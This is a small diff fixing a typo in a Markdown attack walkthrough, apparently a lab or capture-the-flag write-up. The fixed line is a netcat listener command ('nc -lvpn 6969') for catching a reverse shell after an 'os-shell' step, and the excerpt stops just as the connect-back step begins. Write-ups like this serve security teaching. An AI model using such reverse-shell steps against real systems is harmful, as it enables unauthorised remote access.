@@ -209,7 +209,7 @@ os-shell>
 **Step 3:** Establish a listener on the local machine (https://www.revshells.com/):
 
 ```bash
-bash nc -lvpn 6969` 
+nc -lvpn 6969
 listening on [any] 6969 ...
 ```
 **Step 4:** Connect back from the target machine (https://www.revshells.com/):
